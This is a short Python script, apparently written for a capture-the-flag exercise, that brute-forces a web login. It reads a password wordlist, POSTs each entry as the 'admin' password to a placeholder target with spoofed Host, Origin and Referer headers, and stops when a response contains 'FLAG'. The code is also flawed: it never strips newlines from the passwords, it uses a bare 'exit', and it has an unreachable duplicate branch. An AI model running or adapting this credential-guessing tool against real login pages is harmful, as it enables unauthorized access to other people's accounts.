import requests

wordlist = "path/to/wordlist"

with open(wordlist, encoding="utf8") as f:
    for line in f:
        password = line
        url = 'TARGET'
        headers = {'Host': 'HEADER',
                   'Origin': 'HEADER',
                   'Referer': 'HEADER'}
        
        data = {'user': 'admin',
                'password': password,
                }


        # Send POST request with FORM data using the data parameter
        response = requests.post(url, data=data, headers=headers, allow_redirects=False)

        print(response.text)

        if "FLAG" in response.text:
            print('Good')
            print(data['password'])
            exit
        elif "FLAG" in response.text:
            exit()
        else:
            print('Bad')
